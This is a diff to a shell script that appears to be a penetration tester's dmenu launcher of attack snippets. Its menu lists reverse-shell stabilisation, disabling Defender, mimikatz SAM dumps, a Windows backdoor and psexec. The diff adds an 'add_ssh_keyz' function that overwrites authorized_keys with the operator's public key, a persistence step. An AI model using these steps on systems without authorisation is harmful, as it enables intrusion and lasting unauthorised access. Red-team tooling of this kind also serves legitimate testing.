@@ -30,7 +30,7 @@ function_meta=("bye_bye_defender" "Stabilise_reverse_shell" "Stabilise_reverse_s
 	"vim_hexdump_ascii" "vim_hexdump_binary" "meterpreter_proxychain" \
 	"tmux_sinc_panes_on" "tmux_sinc_panes_off" "mimikatz_dump_sam" "activate_rdp" "backdoor_win" \
 	"powershell_find_txt" "powershell_find_ps1" "sharphound_exe_collect" "at_exec_ma_boy" "psexec_outa_here" \
-	"secdump_over_the_air" "file_splitter")
+	"secdump_over_the_air" "file_splitter" "add_ssh_keyz")
 
 # function that are needed
 function stabilize_rev_shell() {
@@ -215,6 +215,12 @@ function file_splitter() {
 	ripdrag $(/usr/bin/ls $working_dir)
 }
 
+function add_ssh_keyz() {
+	KEY_PATH=${HOME}/.ssh/id_rsa.pub
+
+	command "echo \"$(cat ${KEY_PATH})\" > ~/.ssh/authorized_keys"
+}
+
 ret=$(echo ${function_meta[*]} | tr ' ' '\n' | dmenu "$@")
 
 
@@ -256,5 +262,7 @@ if [ ! -z $ret ]; then
 		secdump_over_the_air
 	elif [ $ret = "file_splitter" ]; then
 		file_splitter
+	elif [ $ret = "add_ssh_keyz" ]; then
+		add_ssh_keyz
 	fi
 fi
